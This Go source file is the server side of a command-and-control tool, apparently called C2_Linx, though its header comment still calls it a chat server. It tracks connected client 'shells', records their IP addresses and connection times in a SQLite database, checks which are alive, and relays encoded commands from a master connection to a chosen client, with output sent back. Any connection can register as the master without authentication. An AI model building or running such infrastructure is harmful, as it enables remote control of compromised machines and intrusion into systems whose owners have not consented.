// one sever to more client chat room
//This is chat sever
package main

import (
	"C2_Linx/db"
	"database/sql"
	"time"

	//"C2_Linx/db"
	"C2_Linx/encode"
	//"time"

	//"encoding/base32"
	"fmt"
	"net"
	"os"
	"strings"
)

var ConnMap map[string]net.Conn = make(map[string]net.Conn)  //声明一个集合
var Master2 map[string]net.Conn = make(map[string]net.Conn)  //声明一个集合
var mastername string
var db1 *sql.DB

//ConnMap := make(map[string]net.Conn)

func main() {
	ip_port:="0.0.0.0:"+ string(os.Args[1])
	listen_socket, err := net.Listen("tcp", ip_port)  //打开监听接口
	if err != nil {
		fmt.Println("server start error")
	}
	fmt.Println(ip_port," listenning... ")

	defer listen_socket.Close()
	fmt.Println("server is wating ....")
	db1, err = sql.Open("sqlite3", "userDB.db")

	//db1, err = sql.Open("sqlite3", "D:\\go1.20.2.windows-amd64\\go\\src\\C2_Linx\\db\\userDB.db")
	if err != nil {
		fmt.Println("db open err")
	}
	for {
		conn, err := listen_socket.Accept()  //收到来自客户端发来的消息
		if err != nil {
			fmt.Println("conn fail ...")
		}
		fmt.Println(conn.RemoteAddr(), "connect successed")

		//go handle(conn)  //创建线程
		//
		//go func() {
		//	for {
		//		time.Sleep(10 * time.Second)
		//		for name, conn := range ConnMap {
		//			_, err := conn.Write([]byte{})
		//			if err != nil {
		//				fmt.Println(name, "disconnected")
		//				delete(ConnMap, name)
		//			}
		//			fmt.Println(conn,"   →  ",name, "aaaaaaaa")
		//		}
		//	}
		//}()
		//conn.SetNoDelay(true)
		//conn.SetKeepAlive(true)
		go handle(conn)  //创建线程

	}
}

func handle(conn net.Conn) {
	defer conn.Close()
	tcpConn, ok := conn.(*net.TCPConn)
	if !ok {
		fmt.Println("tcpConn erro")
	}
	tcpConn.SetNoDelay(true)
	tcpConn.SetKeepAlive(true)    //保持一直连接状态
	for {
		data := make([]byte, 1024)  //创建字节流 （此处同 一对一 通信）
		//msg_read, err := conn.Read(data[:])  //声明并将从客户端读取的消息赋给msg_read 和err
		//if msg_read == 0 || err != nil { //如果字节流为0或者有错误
		//	fmt.Println(err)
		//	break
		//}
		var message []byte
		//解决了长度的问题
		for {
			n, err := conn.Read(data)
			if err != nil {
				fmt.Println("Error reading message:", err)
				return
			}
			fmt.Println("n是什么 : ",n)
			message = append(message, data[:n]...)
			fmt.Println("data[:n] : ",data[:n])
			fmt.Println("message : ",message)

			if len(message) >= 1024*1024 {
				fmt.Println("Message length exceeds the maximum allowed limit.")
				fmt.Println("lenght : ",len(message))
				return
			}
			fmt.Println("lenght2 : ",len(message))
			if n < len(data) {
				break
			}
		}

		// 处理完整的消息
		//fmt.Println("Received message:", string(message))
		decode :=encode.Dec(string(message))
		//decode :=string(message)
		//解析协议
		//decode :=dec(string(data[0:msg_read]))
		//decode :=dec(string(data))
		msg_str := strings.Split(decode, "|")  //将从客户端收到的字节流分段保存到msg_str这个数组中


		switch msg_str[0] {
		case "nick":  //加入聊天室
			fmt.Println(conn.RemoteAddr(), "-->", msg_str[1])  //msg_str[1]客户端的名字
			//for k, v := range ConnMap {  //遍历集合中存储的客户端消息 //k就是msg_str[1]客户端的名字，v是conn
			//	if k != msg_str[1] {
			//		v.Write([]byte("[" + msg_str[1] + "]: join..."))
			//	}
			//}
			ConnMap[msg_str[1]] = conn   //客户端的conn 很关键

			currentTime := time.Now()
			currentTimeString := currentTime.Format("2006-01-02 15:04:05")//整个format很奇怪，只能是这个日期才能精准识别 不知道linux上会不会有bug
			fmt.Println(currentTimeString)
			db.Insert(db1,conn.RemoteAddr().String(),msg_str[1],currentTimeString)

		case "say":   //转发消息
			for k, v := range ConnMap {  //k指客户端昵称   v指客户端连接服务器端后的地址
				if k != msg_str[1] {  //判断是不是给自己发，如果不是
					//fmt.Println("Send "+msg_str[2]+" to ", k)  //服务器端将消息转发给集合中的每一个客户端
					v.Write([]byte("[" + msg_str[1] + "]: " + msg_str[2]))  //给除了自己的每一个客户端发送自己之前要发送的消息
				}
			}

		case "addmaster":
			fmt.Println(conn.RemoteAddr(), "master --> ", msg_str[1])  //msg_str[1]客户端的名字
			mastername = msg_str[1]
			//for k, v := range ConnMap {  //遍历集合中存储的客户端消息 //k就是msg_str[1]客户端的名字，v是conn
			//	if k != msg_str[1] {
			//		v.Write([]byte("[" + msg_str[1] + "]: join..."))
			//	}
			//}
			Master2[msg_str[1]] = conn   //客户端的conn 很关键

		case "show":
			var name string = ""
			//展示已经获取到连接的c2-client
			for k, _ := range ConnMap {
				name = name+ k + "|"
			}
			fmt.Println("master: " ,name)
			conn.Write([]byte("\n"+"--------------------------------------------------------"+"\n"+"have shell list: "+"\n" + "|"+name+"\n"+"--------------------------------------------------------"))

		case "select":   //需要加密
			for k, v := range ConnMap { //k指客户端昵称   v指客户端连接服务器端后的地址
				if k == msg_str[1] { //判断输入的客户端，然后下发指令
					fmt.Println("master Send "+msg_str[2]+" to ", k)  //select|kali|whoami   msg_str[2]就是下发的命令

					v.Write([]byte(encode.Enc("to_master|"+mastername +"|"+ msg_str[2])))//下发给对应的客户端
				}else {
					fmt.Println("c2名字输入错误  err ")
					//conn.Write([]byte("c2名字输入错误  err "))
				}
			}


		case "to_master":  //需要解密
			for k, v := range Master2 {  //k指客户端昵称   v指客户端连接服务器端后的地址
				if k == msg_str[1] {  //判断是不是给自己发，如果不是
					fmt.Println("cilent Send "+msg_str[2]+" to ", k)  //服务器端将消息转发给集合中的每一个客户端
					v.Write([]byte( msg_str[2]))  //给除了自己的每一个客户端发送自己之前要发送的消息

					//key := byte(0x7F)
					//bytes := []byte(msg_str[2])
					//// decrypt the byte slice using XOR encryption
					//for i := 0; i < len([]byte(msg_str[2])); i++ {
					//	bytes[i] ^= key
					//}
					//fmt.Println("to master bytes    ",string(bytes))
					//v.Write(bytes)  //给除了自己的每一个客户端发送自己之前要发送的消息

				}
			}


		case "history":
			b :=db.Query2(db1)
			fmt.Println(len(b))
			var name string = ""
			for i:=0;i<len(b);i++{
				name ="|" +b[i].Hostname+"  " + b[i].ConnIP+"  " +b[i].Time+"|"+"\n"+name
			}
			fmt.Println(name)
			conn.Write([]byte(name))
		case "checkalive":
			for name, v := range ConnMap {
				_, err := v.Write([]byte(encode.Enc("checkalive|alive")))
				if err != nil {
					fmt.Println(name, "disconnected")
					delete(ConnMap, name)
				}
				fmt.Println(v,"   →  ",name, "aaaaaaaa")
			}
			var name string = ""
			//展示已经获取到连接的c2-client
			for k, _ := range ConnMap {
				name = name+ k + "|"
			}
			fmt.Println("master: " ,name)
			conn.Write([]byte("\n"+"--------------------------------------------------------"+"\n"+"have alive shell list: "+"\n" + "|"+name+"\n"+"--------------------------------------------------------"))


			//case "quit":  //退出
			//	for k, v := range ConnMap {  //遍历集合中的客户端昵称
			//		if k != msg_str[1] {  //如果昵称不是自己
			//			v.Write([]byte("[" + msg_str[1] + "]: quit"))  //给除了自己的其他客户端昵称发送退出的消息，并使Write方法阻塞
			//		}
			//	}
			//	delete(ConnMap, msg_str[1])  //退出聊天室
		}
	}
}
